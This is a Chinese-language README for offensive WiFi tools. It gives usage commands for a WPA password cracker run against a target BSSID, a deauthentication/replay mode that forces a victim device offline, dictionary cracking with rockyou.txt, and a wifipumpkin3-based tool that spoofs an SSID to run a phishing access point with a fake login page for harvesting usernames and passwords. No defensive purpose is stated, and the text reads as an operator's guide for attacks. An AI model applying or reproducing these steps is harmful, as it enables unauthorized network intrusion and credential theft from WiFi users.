## V2.0
### wifi_password_crack.py

使用python3 wifi_password_crack.py
另起一个终端执行:
curl -d '{"bssid":"AP_bssid","dssid":"client_bssid","device":"wlan0"}' -H "Content-Type: application/json" -X POST 127.0.0.1:10001/start
静待60秒喝口咖啡大概率会出


## V1.0
### wifi.py

-device 指定网卡设备,若不指定此项则会使用wlan0
-bssid 必选项 若不指定无法正常工作
-w 指定字典 若不填则默认/usr/wordlist/rockyou.txt
-dssid 若使用a模式 则需要设置为被攻击设备的bssid

-mode 指定攻击模式,若不指定则默认使用s
	s 扫描模式 若指定-bssid则监听指定设备,若不指定则会进行全信道的扫描
	a 重放攻击,需要使用-dssid指定被攻击的设备
	c 破解模式,可使用-w来指定字典

python wifi.py 
进入扫描模式

python wifi.py -bssid [bssid]
监听此bssid的设备

python wifi.py -mdoe a -bssid [bssid] -dssid [dssid]
进行重放攻击 ,使设备强制离线重连(使用此选项时应该另开一个新终端以保证能一直进行抓包)

python wifi.py -mode c -w [passwordlist]
对wifi密码进行破解,-w选项可进行选填

-----

### wifi_MITM.py
使用此工具前应当先安装wifipumpkin3并确认能正常运行

-i 指定监听的网卡设备,若不指定则默认为wlan0
-ssid 必填项,指定要伪装的ssid
-p 代理模式
	0 无代理模式
	1 在 TCP 协议上拦截网络流量的代理
	2 允许阻止用户访问互联网，直到打开登录页面输入用户名和密码

sudo wifi_MITM.py -ssid [ssid]
此选项会根据指定的ssid名称来生成一个钓鱼wifi

sudo wifi_MITM.py -ssid [ssid] -p 2
此选项会根据指定的ssid名称来生成一个钓鱼wifi,用户连接后将会跳转至登录界面并要求输入账户名和密码
